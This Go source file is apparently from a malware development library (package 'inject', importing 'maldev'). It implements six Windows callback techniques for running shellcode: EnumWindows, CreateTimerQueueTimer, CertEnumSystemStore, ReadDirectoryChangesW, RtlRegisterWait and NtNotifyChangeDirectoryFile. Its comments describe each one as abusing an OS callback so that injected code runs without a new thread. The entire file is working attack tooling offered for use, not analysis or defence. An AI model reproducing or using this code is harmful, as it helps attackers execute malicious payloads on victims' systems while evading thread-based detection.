//go:build windows

package inject

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// CallbackMethod identifies the callback technique used for shellcode execution.
type CallbackMethod int

const (
	// CallbackEnumWindows uses user32.EnumWindows to invoke the shellcode as a
	// window enumeration callback.
	CallbackEnumWindows CallbackMethod = iota

	// CallbackCreateTimerQueue uses kernel32.CreateTimerQueueTimer to invoke
	// the shellcode as a timer callback in the current thread.
	CallbackCreateTimerQueue

	// CallbackCertEnumSystemStore uses crypt32.CertEnumSystemStore to invoke
	// the shellcode as a certificate store enumeration callback.
	CallbackCertEnumSystemStore

	// CallbackReadDirectoryChanges uses kernel32.ReadDirectoryChangesW to invoke
	// shellcode as a directory change notification callback.
	CallbackReadDirectoryChanges

	// CallbackRtlRegisterWait uses ntdll.RtlRegisterWait to invoke shellcode
	// as a wait callback on an event object.
	CallbackRtlRegisterWait

	// CallbackNtNotifyChangeDirectory uses ntdll.NtNotifyChangeDirectoryFile
	// to invoke shellcode as an async APC completion.
	CallbackNtNotifyChangeDirectory
)

// String returns the MSDN-style name for the callback method.
func (m CallbackMethod) String() string {
	switch m {
	case CallbackEnumWindows:
		return "EnumWindows"
	case CallbackCreateTimerQueue:
		return "CreateTimerQueueTimer"
	case CallbackCertEnumSystemStore:
		return "CertEnumSystemStore"
	case CallbackReadDirectoryChanges:
		return "ReadDirectoryChangesW"
	case CallbackRtlRegisterWait:
		return "RtlRegisterWait"
	case CallbackNtNotifyChangeDirectory:
		return "NtNotifyChangeDirectoryFile"
	default:
		return "Unknown"
	}
}

// wtExecuteInTimerThread tells CreateTimerQueueTimer to fire the callback
// in the timer thread instead of a worker thread.
const wtExecuteInTimerThread = 0x20

// certSystemStoreCurrentUser is the CERT_SYSTEM_STORE_CURRENT_USER constant.
const certSystemStoreCurrentUser = 0x10000

// ExecuteCallback runs shellcode at addr using the specified callback mechanism.
// No new thread is created -- the callback runs in the current thread context
// (or the timer thread for CreateTimerQueue). The caller must ensure addr
// points to executable memory containing valid shellcode.
func ExecuteCallback(addr uintptr, method CallbackMethod) error {
	if addr == 0 {
		return fmt.Errorf("callback address is zero")
	}

	switch method {
	case CallbackEnumWindows:
		return executeEnumWindows(addr)
	case CallbackCreateTimerQueue:
		return executeTimerQueue(addr)
	case CallbackCertEnumSystemStore:
		return executeCertEnum(addr)
	case CallbackReadDirectoryChanges:
		return executeReadDirChanges(addr)
	case CallbackRtlRegisterWait:
		return executeRtlRegisterWait(addr)
	case CallbackNtNotifyChangeDirectory:
		return executeNtNotifyChange(addr)
	default:
		return fmt.Errorf("unsupported callback method")
	}
}

// executeEnumWindows abuses EnumWindows: the OS calls addr(hwnd, lParam) for
// each top-level window. Shellcode runs until it returns FALSE (0).
func executeEnumWindows(addr uintptr) error {
	ret, _, err := api.ProcEnumWindows.Call(addr, 0)
	// EnumWindows returns 0 on failure, but our callback intentionally
	// returns 0 to stop enumeration. Only treat as error if the syscall
	// itself failed with a real error code (not ERROR_SUCCESS).
	if ret == 0 && err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("callback execution failed: %w", err)
	}
	return nil
}

// executeTimerQueue abuses CreateTimerQueueTimer with WT_EXECUTEINTIMERTHREAD
// so the callback fires synchronously in the timer thread.
func executeTimerQueue(addr uintptr) error {
	var hTimer uintptr
	ret, _, err := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		0, // default timer queue
		addr,
		0,    // parameter
		0,    // due time (immediate)
		0,    // period (one-shot)
		wtExecuteInTimerThread,
	)
	if ret == 0 {
		return fmt.Errorf("callback execution failed: %w", err)
	}
	// Brief wait to let the timer fire before cleanup.
	api.ProcWaitForSingleObject.Call(uintptr(hTimer), 100)
	return nil
}

// executeCertEnum abuses CertEnumSystemStore: the OS calls addr for each
// certificate store. Shellcode runs as the enumeration callback.
func executeCertEnum(addr uintptr) error {
	// CertEnumSystemStore returns TRUE on success. The callback may cause
	// enumeration to stop early, which is expected.
	api.ProcCertEnumSystemStore.Call(
		certSystemStoreCurrentUser,
		0, // reserved
		0, // pArg
		addr,
	)
	return nil
}

// openTempDirForWatch creates a temp directory and opens it async (FILE_FLAG_OVERLAPPED)
// for ReadDirectoryChangesW / NtNotifyChangeDirectoryFile. Caller must CloseHandle
// the returned handle and os.Remove the returned path.
func openTempDirForWatch(prefix string) (windows.Handle, string, error) {
	tmp, err := os.MkdirTemp("", prefix)
	if err != nil {
		return 0, "", fmt.Errorf("create temp dir: %w", err)
	}
	p, _ := syscall.UTF16PtrFromString(tmp)
	hDir, err := windows.CreateFile(
		p,
		windows.FILE_LIST_DIRECTORY,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_OVERLAPPED,
		0,
	)
	if err != nil {
		os.Remove(tmp) //nolint:errcheck
		return 0, "", fmt.Errorf("open temp dir: %w", err)
	}
	return hDir, tmp, nil
}

// triggerDirChange writes then removes a file in dir to trigger any pending
// directory change notification, then drains APCs via SleepEx(alertable).
func triggerDirChange(dir string, drainMs uint32) {
	dummy := dir + "\\x"
	os.WriteFile(dummy, []byte{}, 0600) //nolint:errcheck
	os.Remove(dummy)                    //nolint:errcheck
	windows.SleepEx(drainMs, true)
}

// executeReadDirChanges registers shellcode as an async completion routine via
// ReadDirectoryChangesW, then triggers it by creating a file in the watched dir.
func executeReadDirChanges(addr uintptr) error {
	hDir, tmp, err := openTempDirForWatch("rdc-*")
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hDir)
	defer os.Remove(tmp)

	buf := make([]byte, 4096)
	var bytesReturned uint32
	overlapped := new(windows.Overlapped)

	ret, _, callErr := api.ProcReadDirectoryChangesW.Call(
		uintptr(hDir),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,    // bWatchSubtree = FALSE
		0x01, // FILE_NOTIFY_CHANGE_FILE_NAME
		uintptr(unsafe.Pointer(&bytesReturned)),
		uintptr(unsafe.Pointer(overlapped)),
		addr, // lpCompletionRoutine = shellcode
	)
	if ret == 0 {
		return fmt.Errorf("ReadDirectoryChangesW: %w", callErr)
	}
	triggerDirChange(tmp, 50)
	return nil
}

// executeRtlRegisterWait registers shellcode as a wait callback, then signals
// the event to trigger it. WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION plus
// RtlDeregisterWaitEx(INVALID_HANDLE_VALUE) guarantees the callback has
// completed before we return, so the caller may safely free the shellcode
// memory without risking a post-free invocation by the wait thread.
func executeRtlRegisterWait(addr uintptr) error {
	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("CreateEvent: %w", err)
	}
	defer windows.CloseHandle(hEvent)

	const (
		wtExecuteOnlyOnce      = 0x00000008
		wtExecuteLongFunction  = 0x00000010
	)

	var hWait uintptr
	r, _, callErr := api.ProcRtlRegisterWait.Call(
		uintptr(unsafe.Pointer(&hWait)),
		uintptr(hEvent),
		addr,
		0, // context
		0, // timeout (fires immediately on signal)
		wtExecuteOnlyOnce|wtExecuteLongFunction,
	)
	if r != 0 {
		return fmt.Errorf("RtlRegisterWait: NTSTATUS 0x%X: %w", uint32(r), callErr)
	}

	windows.SetEvent(hEvent) //nolint:errcheck
	windows.SleepEx(100, true)

	// Block until any in-flight callback has finished.
	const invalidHandleValue = ^uintptr(0)
	api.ProcRtlDeregisterWaitEx.Call(hWait, invalidHandleValue) //nolint:errcheck
	return nil
}

// executeNtNotifyChange registers shellcode as an APC via NtNotifyChangeDirectoryFile,
// then triggers it by creating a file in the watched directory.
func executeNtNotifyChange(addr uintptr) error {
	hDir, tmp, err := openTempDirForWatch("ntnotify-*")
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hDir)
	defer os.Remove(tmp)

	buf := make([]byte, 4096)
	overlapped := new(windows.Overlapped)

	r, _, callErr := api.ProcNtNotifyChangeDirectoryFile.Call(
		uintptr(hDir),
		0,    // Event = NULL
		addr, // ApcRoutine = shellcode
		0,    // ApcContext
		uintptr(unsafe.Pointer(overlapped)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0x01, // FILE_NOTIFY_CHANGE_FILE_NAME
		0,    // WatchTree = FALSE
	)
	// STATUS_PENDING (0x103) means the async operation was queued successfully;
	// the APC fires later when the directory changes.
	const statusPending = 0x103
	if r != 0 && uint32(r) != statusPending {
		return fmt.Errorf("NtNotifyChangeDirectoryFile: NTSTATUS 0x%X: %w", uint32(r), callErr)
	}
	triggerDirChange(tmp, 100)
	return nil
}
